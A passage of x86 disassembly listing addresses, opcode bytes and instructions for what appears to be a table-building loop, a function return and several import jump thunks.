  406b35:	8b cf                	mov    %edi,%ecx
  406b37:	33 f2                	xor    %edx,%esi
  406b39:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406b3c:	8b cb                	mov    %ebx,%ecx
  406b3e:	8b d7                	mov    %edi,%edx
  406b40:	89 75 f8             	mov    %esi,-0x8(%ebp)
  406b43:	d3 e2                	shl    %cl,%edx
  406b45:	4a                   	dec    %edx
  406b46:	23 d6                	and    %esi,%edx
  406b48:	8b ca                	mov    %edx,%ecx
  406b4a:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406b4d:	3b 8c 95 50 ff ff ff 	cmp    -0xb0(%ebp,%edx,4),%ecx
  406b54:	74 1a                	je     0x406b70
  406b56:	2b 5d 20             	sub    0x20(%ebp),%ebx
  406b59:	8b f7                	mov    %edi,%esi
  406b5b:	4a                   	dec    %edx
  406b5c:	8b cb                	mov    %ebx,%ecx
  406b5e:	d3 e6                	shl    %cl,%esi
  406b60:	4e                   	dec    %esi
  406b61:	23 75 f8             	and    -0x8(%ebp),%esi
  406b64:	3b b4 95 50 ff ff ff 	cmp    -0xb0(%ebp,%edx,4),%esi
  406b6b:	75 e9                	jne    0x406b56
  406b6d:	89 55 f4             	mov    %edx,-0xc(%ebp)
  406b70:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  406b74:	0f 85 3f fe ff ff    	jne    0x4069b9
  406b7a:	ff 45 fc             	incl   -0x4(%ebp)
  406b7d:	83 45 e4 04          	addl   $0x4,-0x1c(%ebp)
  406b81:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406b84:	ff 45 d8             	incl   -0x28(%ebp)
  406b87:	3b 4d e8             	cmp    -0x18(%ebp),%ecx
  406b8a:	0f 8e 1a fe ff ff    	jle    0x4069aa
  406b90:	33 c0                	xor    %eax,%eax
  406b92:	39 45 d0             	cmp    %eax,-0x30(%ebp)
  406b95:	74 09                	je     0x406ba0
  406b97:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  406b9b:	74 03                	je     0x406ba0
  406b9d:	83 c8 ff             	or     $0xffffffff,%eax
  406ba0:	5f                   	pop    %edi
  406ba1:	5e                   	pop    %esi
  406ba2:	5b                   	pop    %ebx
  406ba3:	c9                   	leave
  406ba4:	c2 24 00             	ret    $0x24
  406ba7:	cc                   	int3
  406ba8:	ff 25 64 72 40 00    	jmp    *0x407264
  406bae:	ff 25 60 72 40 00    	jmp    *0x407260
  406bb4:	ff 25 5c 72 40 00    	jmp    *0x40725c
